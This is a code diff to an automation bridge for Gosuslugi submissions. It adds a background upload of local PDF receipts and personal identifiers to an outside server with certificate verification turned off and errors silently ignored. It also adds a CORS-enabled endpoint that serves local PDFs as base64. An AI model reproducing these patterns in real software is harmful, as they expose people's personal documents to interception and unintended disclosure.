@@ -87,6 +87,67 @@ def scan_downloads_pdfs():
     return found
 
 
+UPLOADED_PDFS_SET = set()
+
+
+def find_local_pdf_path(pdf_filename: str):
+    if not pdf_filename:
+        return None
+    safe_name = os.path.basename(str(pdf_filename).strip())
+    candidates = [
+        Path.home() / "Downloads" / safe_name,
+        Path(CURRENT_DIR) / "downloads" / safe_name,
+        Path(CURRENT_DIR) / safe_name,
+    ]
+    for c in candidates:
+        if c.exists() and c.is_file():
+            return c
+    return None
+
+
+def upload_pdf_to_central_server_async(entry: dict):
+    """Uploads a local Gosuslugi PDF receipt to https://hr.pondera.network/api/gosuslugi/pdf in a background thread."""
+    pdf_filename = str(entry.get("pdf_filename") or "").strip()
+    if not pdf_filename or pdf_filename in UPLOADED_PDFS_SET:
+        return
+    local_path = find_local_pdf_path(pdf_filename)
+    if not local_path:
+        return
+
+    def _worker():
+        import base64
+        import urllib.request
+        import ssl
+        try:
+            raw_bytes = local_path.read_bytes()
+            if not raw_bytes or len(raw_bytes) > 15 * 1024 * 1024:
+                return
+            b64_str = base64.b64encode(raw_bytes).decode("ascii")
+            payload = json.dumps({
+                "filename": local_path.name,
+                "pdf_base64": b64_str,
+                "application_no": str(entry.get("application_no") or "").strip(),
+                "sicil_no": str(entry.get("sicil_no") or entry.get("sicil") or "").strip(),
+            }).encode("utf-8")
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            req = urllib.request.Request(
+                "https://hr.pondera.network/api/gosuslugi/pdf",
+                data=payload,
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
+                if resp.status == 200:
+                    UPLOADED_PDFS_SET.add(pdf_filename)
+                    print(f"[RPA BRIDGE] Uploaded PDF to central server: {local_path.name}")
+        except Exception:
+            pass
+
+    threading.Thread(target=_worker, daemon=True).start()
+
+
 class RPAState:
     is_running = False
     waiting_for_manual = False
@@ -137,6 +198,8 @@ class RPAState:
         if not updated:
             cls.submissions.append(entry)
         save_applications_ledger(cls.submissions)
+        if entry.get("pdf_filename"):
+            upload_pdf_to_central_server_async(entry)
 
     @classmethod
     def add_log(cls, msg: str):
@@ -387,6 +450,30 @@ class RPABridgeHandler(BaseHTTPRequestHandler):
             self.send_header("Content-Type", "application/json; charset=utf-8")
             self.end_headers()
             self.wfile.write(json.dumps(data, ensure_ascii=False).encode("utf-8"))
+        elif parsed.path == "/pdf-base64":
+            import base64
+            from urllib.parse import parse_qs
+            qs = parse_qs(parsed.query)
+            file_arg = (qs.get("file") or [""])[0].strip()
+            local_p = find_local_pdf_path(file_arg)
+            if local_p:
+                raw_bytes = local_p.read_bytes()
+                b64_str = base64.b64encode(raw_bytes).decode("ascii")
+                self.send_response(200)
+                self._send_cors_headers()
+                self.send_header("Content-Type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "success": True,
+                    "filename": local_p.name,
+                    "pdf_base64": b64_str,
+                }).encode("utf-8"))
+            else:
+                self.send_response(404)
+                self._send_cors_headers()
+                self.send_header("Content-Type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "message": "PDF not found locally"}).encode("utf-8"))
         else:
             self.send_response(404)
             self._send_cors_headers()
